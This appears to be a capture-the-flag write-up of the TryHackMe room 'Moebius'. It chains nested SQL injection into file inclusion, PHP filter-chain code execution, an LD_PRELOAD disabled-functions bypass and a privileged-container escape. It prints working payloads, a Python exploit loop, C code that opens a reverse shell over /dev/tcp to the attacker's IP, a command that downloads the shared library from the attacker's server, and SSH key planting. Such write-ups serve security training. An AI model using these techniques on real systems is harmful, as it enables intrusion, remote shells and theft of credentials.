**Moebius** started by abusing a **nested SQL injection** vulnerability to achieve **Local File Inclusion (LFI)**, which we then turned into **code execution** using **PHP filters chain**. We then bypassed disabled functions to achieve **Remote Code Execution (RCE)**, allowing us to gain a shell inside a Docker container. By escaping the container through mounting the host's file system, we captured the user flag. Lastly, we found the root flag inside the database and completed the room.

## Initial Enumeration

### Nmap Scan

We start with an **`nmap`** scan:

```
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.152.169
Nmap scan report for 10.10.152.169
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Image Grid
```

There are two ports open:

- **22** (`SSH`)
- **80** (`HTTP`)

### Web 80

Visiting `http://10.10.152.169/`, we see a site for cat pictures with links to `/album.php`, with the `short_tag` variable set to **cute**, **smart**, or **fav**, depending on the album we choose.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

Checking `http://10.10.152.169/album.php`, we can see that images from the selected album are displayed on the page via requests to the `/image.php` endpoint with the `hash` and `path` variables.

![Web 80 Album](web_80_album.webp){: width="1200" height="600"}

Lastly, checking `http://10.10.152.169/image.php` with the variables set by `album.php`, we simply see the image being displayed.

![Web 80 Image](web_80_image.webp){: width="1200" height="600"}

It seems that `image.php` includes the file passed with the `path` argument, but there is also the `hash` variable, probably calculated from the `path` to prevent the inclusion of arbitrary files, as modifying either of them results in an **Image not found** error.

![Web 80 Image Error](web_80_image_error.webp){: width="1000" height="500"}

## Foothold

### SQL Injection

At this point, we can try to guess how the `hash` variable is calculated for the given `path` to be able to include any file we want, but this does not seem very viable as there are too many possible ways it could be calculated, and there is a high chance the calculation includes a secret unknown to us.

Instead, going back to `album.php` and testing the `short_tag` variable for **SQL injection** with the `smart'` payload, we can see that it is vulnerable to **SQL injection**, as we get an error from the database.

![Web 80 Album Sqli](web_80_album_sqli.webp){: width="1200" height="600"}

Trying a basic payload such as `smart' AND 1=1;-- -` with the request `http://10.10.152.169/album.php?short_tag=smart' AND 1=1;-- -`, we get an interesting error: **Hacking attempt**. It seems there are some filters in place.

![Web 80 Album Sqli Two](web_80_album_sqli2.webp){: width="900" height="300"}

Through the process of elimination, we can see that if our payload includes the `;` character, we get the **Hacking attempt** message.

![Web 80 Album Sqli Three](web_80_album_sqli3.webp){: width="900" height="300"}

We can use `ffuf` to fuzz for every special character and discover that, along with the `;` character, the `/` character is also being filtered. Neither of them is a problem, as we can simply omit `;` and there is no need for `/`.

```console
$ ffuf -u 'http://10.10.152.169/album.php?short_tag=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -mr 'Hacking attempt'

```
{: .wrap }

Instead of enumerating the database manually, we can simply run **sqlmap** against it and discover that there are two databases: `information_schema` and `web`.

```console
$ sqlmap -u 'http://10.10.152.169/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --threads 10 --batch --dbs
...
available databases [2]:
[*] information_schema
[*] web
```
{: .wrap }

Dumping the `web` database, there are two tables in it: `images` and `albums`, with nothing seemingly important.

```console
$ sqlmap -u 'http://10.10.152.169/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --threads 10 --batch -D web --hex --dump

Database: web
Table: images
[16 entries]

| 2  | Smart cats     | smart     | So smart...              |
| 3  | Favourite cats | fav       | My favourite ones        |
+----+----------------+-----------+--------------------------+
```
{: .wrap }

Since we also have access to the `information_schema` database, we can run **sqlmap** with the `--statement` flag to fetch the current **SQL** statement we are injecting into.

```console
$ sqlmap -u 'http://10.10.152.169/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --batch -D web --statement --hex

SQL statements [1]:
[*] SELECT id from albums where short_tag = 'smart' AND (SELECT 2144 FROM(SELECT COUNT(*),CONCAT(0x717a6b7671,(SELECT MID((HEX(IFNULL(CAST(INFO AS NCHAR),0x20))),301,16) FROM INFORMATION_SCHEMA.PROCESSLIST),0x71786b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IVDO'
```
{: .wrap }

Looking at the statement `SELECT id from albums where short_tag = 'smart'`, we can see that the application simply fetches the `id` for the album the user selected using the `short_tag`.

### Nested SQL Injection

At this point, we didn't get much out of the database, but we learned a couple of things to make some assumptions.

First of all, we know that the query we inject into, **`SELECT id from albums where short_tag = '<short_tag>'`**, simply fetches the album `id` from the `albums` table. However, if we look at the output of **album.php** with a valid `short_tag`, we can see that the page also displays the `paths` for the images, which are stored in the `images` table.

![Web 80 Album Source](web_80_album_source.webp){: width="1200" height="600"}

So, it is most likely that after the application fetches the album `id` with the **`SELECT id from albums where short_tag = '<short_tag>'`** query, it runs another query like **`SELECT * from images where album_id = <album_id>`**, with the `album_id` being the result of the previous query, and there is a chance that the `album_id` in this second query (which comes directly as the result of the first query) is not sanitized, just like the `short_tag` in the previous query, once again allowing **SQL injection**.

Secondly, looking at the database, we don't see the hashes for the images, so it is also probable that after fetching the paths for the images with the second query, **album.php** calculates the hashes programmatically. This means that if we can inject into this second query and make it return what we want as the `path`, we can force **album.php** to calculate the `hash` for that path and use it at **/image.php** to include any file we want.

We don't know if the application exactly works this way, but we can simply test it. First, using a payload like `jxf' UNION SELECT 0-- -` on the `short_tag` variable for **album.php** with the request `http://10.10.152.169/album.php?short_tag=jxf' UNION SELECT 0-- -`, we can see that we are able to control the `album_id` returned by the query.

![Web 80 Album Sqli Four](web_80_album_sqli4.webp){: width="800" height="300"}

Now, instead of an `id`, with a payload like `jxf' UNION SELECT "0 OR 1=1-- -"-- -`, we can make the first query return **`0 OR 1=1-- -`** as the album `id`, and if our theory is right, the second query would be something like **`SELECT * from images where album_id=0 OR 1=1-- -`**, which would cause all the images to be displayed. Testing this, we can see that it works exactly as we hoped.

![Web 80 Album Sqli Five](web_80_album_sqli5.webp){: width="1200" height="600"}

Next, trying a **UNION**-based payload to control the `path` returned by the second query, we are successful with three columns using the payload `jxf' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- -`, and we can see that the third column is the `path`.

![Web 80 Album Sqli Six](web_80_album_sqli6.webp){: width="1000" height="400"}

Now, trying to set the `path` as `/etc/passwd` to force **album.php** to calculate the hash for this path and use it at **/image.php** to read it, with the payload `jxf' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -`, we once again encounter the **Hacking attempt** error, as `/` is a filtered character.

![Web 80 Album Sqli Seven](web_80_album_sqli7.webp){: width="1000" height="300"}

However, this is not really a problem, as we can simply **hex encode** the `/etc/passwd` to bypass the filter with the payload: `jxf' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -`. We can see that this works, and we get the calculated hash for `/etc/passwd` as `9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d`.

![Web 80 Album Sqli Eight](web_80_album_sqli8.webp){: width="1100" height="400"}

Now visiting `http://10.10.152.169/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd`, we can see that we were successfully able to include the `/etc/passwd` file and read its contents.

![Web 80 Image Include](web_80_image_include.webp){: width="1100" height="400"}

### Reading Application Files

At this point, since we are able to include arbitrary files, we could attempt log poisoning to escalate the LFI into RCE. However, we are unable to find a suitable log file to poison.

Instead, we can use a PHP wrapper like `php://filter/convert.base64-encode/resource=` to read and enumerate application files.

First, we convert `php://filter/convert.base64-encode/resource=album.php` to hexadecimal (`7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870`) and craft the following payload:

```text
jxf' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -
```

This forces the application to calculate the hash for the path `php://filter/convert.base64-encode/resource=album.php`.

![Web 80 Album Sqli Nine](web_80_album_sqli9.webp){: width="1200" height="450"}

With the calculated hash, we are able to read the source code of `album.php` as such:

```bash
$ curl -s 'http://10.10.152.169/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php' | base64 -d
```
{: .wrap }

Output:

```php
...
<?php

include('dbconfig.php');

try {
    // Create a new PDO instance
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);

    // Set PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if (preg_match('/[\/;]/', $_GET['short_tag'])) {
        // If it does, terminate with an error message
        die("Hacking attempt");
    }

    $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
    $result_album = $conn->prepare($album_id);
    $result_album->execute();

    $r=$result_album->fetch();
    $id=$r['id'];


    // Fetch image IDs from the database
    $sql_ids = "SELECT * FROM images where album_id=" . $id;
    $stmt_path= $conn->prepare($sql_ids);
    $stmt_path->execute();

    // Display the album id
    echo "<!-- Short tag: " . $_GET['short_tag'] . " - Album ID: " . $id . "-->\n";
    // Display images in a grid
    echo '<div class="grid-container">' . "\n";
    foreach ($stmt_path as $row) {
        // Get the image ID
        $path = $row["path"];
        $hash = hash_hmac('sha256', $path, $SECRET_KEY);

        // Create link to image.php with image ID
        echo '<div class="image-container">' . "\n";
        echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
        echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
...
```
{: .wrap }

Reading the source code of `album.php`, we see that the application calculates hashes using HMAC-SHA256:

```php
$hash = hash_hmac('sha256', $path, $SECRET_KEY);
```

However, the `SECRET_KEY` is not defined inside `album.php` — instead, it includes `dbconfig.php`, so it is most likely that the key is defined there.

To retrieve `dbconfig.php`, we repeat the same method: hex-encode the path and create another payload:

```text
jxf' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
```

This allows us to fetch the hash for `php://filter/convert.base64-encode/resource=dbconfig.php`.

![Web 80 Album Sqli Ten](web_80_album_sqli10.webp){: width="1200" height="450"}

Reading the content of `dbconfig.php` gives:

```bash
$ curl -s 'http://10.10.152.169/image.php?hash=329e7517a6e3c82421ee8ce483271c69a71fbcc7e6956abde4957a63f4ad9ccf&path=php://filter/convert.base64-encode/resource=dbconfig.php' | base64 -d
```
{: .wrap }

Output:

```php
<?php
// Database connection settings
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";


$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
?>
```
{: .wrap }

Now that we have the `SECRET_KEY`, we can easily calculate valid HMAC-SHA256 hashes for any path we want.
Here’s a simple Python script to automate this:

```python
import hmac
import hashlib
import sys

secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = sys.argv[1].encode()
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()
print(signature)
```
{: file="hash_calc.py"}

Using this script, we can easily calculate the hash for any target file.
For example, to read the `image.php` source:

```bash
$ python3 hash_calc.py 'php://filter/convert.base64-encode/resource=image.php'
ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6

$ curl -s 'http://10.10.152.169/image.php?hash=ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6&path=php://filter/convert.base64-encode/resource=image.php' | base64 -d
```
{: .wrap }

And the `image.php` source code confirms that once the hash is valid, the file at the given `path` is simply included:

```php
<?php

include('dbconfig.php');
...
    $image_path = $_GET['path'];
    $hash= $_GET['hash'];

    $computed_hash=hash_hmac('sha256', $image_path, $SECRET_KEY);

    if ($image_path && $computed_hash === $hash) {
        // Get the MIME type of the image
        $image_info = @getimagesize($image_path);
        if ($image_info && isset($image_info['mime'])) {
            $mime_type = $image_info['mime'];
            // Set the appropriate content type header
            header("Content-type: $mime_type");

            // Output the image data
            include($image_path);
        } else {
            header("Content-type: application/octet-stream");
            include($image_path);
        }
    } else {
        echo "Image not found";
    }

?>
```
{: .wrap }

### PHP Filters Chain Exploitation

To turn this **LFI** vulnerability into **RCE**, another method besides log poisoning is to use **PHP filters chain**.
This technique allows us to combine multiple filters to ultimately create a "file" containing whatever content we want and include it — in this case, **PHP code**.

We can generate a filter chain using [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) by **Synacktiv**:

```console
$ python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
[+] The following gadget chain will generate the following code : <?=eval($_GET[0])?> (base64 value: PD89ZXZhbCgkX0dFVFswXSk/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
```

To make exploitation easier, we can write a simple script to execute arbitrary PHP code on the target:

```python
import hmac
import hashlib
import requests

target_url = "http://10.10.152.169/image.php" # change the IP address

secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = "php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp".encode() # replace with the output of php_filter_chain_generator.py 
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()

while True:
    params = {
        "hash": signature,
        "path": path,
        "0": input("code> ")
    }
    resp = requests.get(target_url, params=params, timeout=5)
    text = resp.text
    print(text)
```
{: file="execute_code.py" }

However, when trying to execute the `system()` function to achieve RCE, we encounter the following error:

```console
$ python3 execute_code.py
code> system("id");
<br />
<b>Fatal error</b>:  Uncaught Error: Call to undefined function system() in ...
```

Checking the disabled PHP functions confirms why — `system` (along with many others) is disabled:

```console
code> echo ini_get('disable_functions');
exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig...
```

### Disabled Functions Bypass

It seems that any major function that could help us execute commands on the target has been disabled. However, if we look for ways to bypass disabled functions, we may come across an [interesting method](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#ld_preload-bypass) utilizing the `putenv` and `mail` functions.

Basically, the method uses the `putenv` function to set the `LD_PRELOAD` environment variable. Any shared library specified in this environment variable gets loaded when a program is run. After that, by calling the `mail` function, it causes the `sendmail` program to run, and the library specified in `LD_PRELOAD` gets loaded and executed. We can try to use this method to bypass the disabled functions.

First, we create a shared library (`shell.c`) that executes a reverse shell command:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  system("bash -c \"bash -i >& /dev/tcp/10.14.101.76/443 0>&1\"");
}
```
{: file="shell.c" }

Compiling it:

```console
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Serving it via a simple HTTP server:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now, using the PHP code execution to download the library onto the target:

```console
$ python3 execute_code.py
code> $ch = curl_init('http://10.14.101.76/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
```
{: .wrap }

We can see the library being downloaded from our server:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.152.169 - - [27/Apr/2025 13:47:10] "GET /shell.so HTTP/1.1" 200 -
```

Now, setting the `LD_PRELOAD` environment variable with the `putenv` function to the library we uploaded, and calling the `mail` function to run the `sendmail` program, causing our library to be loaded and executed:

```console
code> putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');
```

With this, we can see that our reverse shell payload is executed, and we get a shell as the `www-data` user inside a container:

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.152.169] 46126

## User Flag

### Container Escape

Checking the `sudo` privileges for the `www-data` user inside the container reveals full access:

```console
www-data@bb28d5969dd5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

Escalating to `root` inside the container:

```console
www-data@bb28d5969dd5:/var/www/html$ sudo su -
root@bb28d5969dd5:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Next, we inspect the effective capabilities of the container:

```console
root@bb28d5969dd5:~# grep CapEff /proc/self/status
CapEff: 000001ffffffffff
```

Decoding this value confirms the container holds many capabilities:

```console
$ capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
```

With these capabilities, there are many ways to escape the container. However, one of the simplest methods would be to mount the host’s root filesystem since we have direct access to the host’s block devices:

```console
root@bb28d5969dd5:~# mount /dev/nvme0n1p1 /mnt
root@bb28d5969dd5:~# cat /mnt/etc/hostname
ubuntu-jammy
```

To convert this filesystem access into a shell, we can add an SSH public key to the host’s `/root/.ssh/authorized_keys`.
First, generating a key pair:

```console
$ ssh-keygen -f id_ed25519 -t ed25519
...
$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali
```

Writing the public key to `/mnt/root/.ssh/authorized_keys` (`/root/.ssh/authorized_keys` on the host):

```console
root@bb28d5969dd5:~# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali' >> /mnt/root/.ssh/authorized_keys
```
{: .wrap }

Now, we can use the private key with SSH to get a shell as the `root` user on the host and read the user flag at `/root/user.txt`.

```console
$ ssh -i id_ed25519 root@10.10.152.169

root@ubuntu-jammy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-jammy:~# wc -c /root/user.txt
38 /root/user.txt
```

## Root Flag

### MySQL Database

From the `dbconfig.php` file, we already knew that the database was running on another host (`db`).
Checking the `docker-compose.yml` at `/root/challenge/docker-compose.yml`, we can see it is another container:

```console
root@ubuntu-jammy:~/challenge# cat docker-compose.yml; echo
version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
    restart: always
```

From the `/root/challenge/db/db.env` file, we can get the `root` password for the **MySQL** server:

```console
root@ubuntu-jammy:~/challenge# cat db/db.env; echo
MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
```

Listing the running containers, we can find the container running the database:

```console
root@ubuntu-jammy:~/challenge# docker container ls
CONTAINER ID   IMAGE                    COMMAND                  CREATED       STATUS       PORTS                                 NAMES
89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   7 weeks ago   Up 4 hours   3306/tcp                              challenge-db-1
bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   7 weeks ago   Up 4 hours   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1
```

We can get a shell inside the database container as follows:

```console
root@ubuntu-jammy:~/challenge# docker container exec -it 8936 bash
```

Connecting to the database with the password we discovered in the `db.env` file and checking the databases, we can see that, apart from the `web` database we already had access to, we have access to one more database: `secret`.

```console
root@89366d62e05c:/# mysql -u root -pgG4i8NFNkcHBwUpd
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| web                |
+--------------------+
6 rows in set (0.004 sec)
```

Checking the tables for the `secret` database, there is one table: `secrets`.

```console
MariaDB [(none)]> use secret;
MariaDB [secret]> show tables;
+------------------+
| Tables_in_secret |
+------------------+
| secrets          |
+------------------+
1 row in set (0.000 sec)
```

Finally, fetching everything from the `secrets` table, we can discover the root flag and complete the room.

```
MariaDB [secret]> select * from secrets;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| THM{[REDACTED]}                       |
+---------------------------------------+
1 row in set (0.000 sec)
```
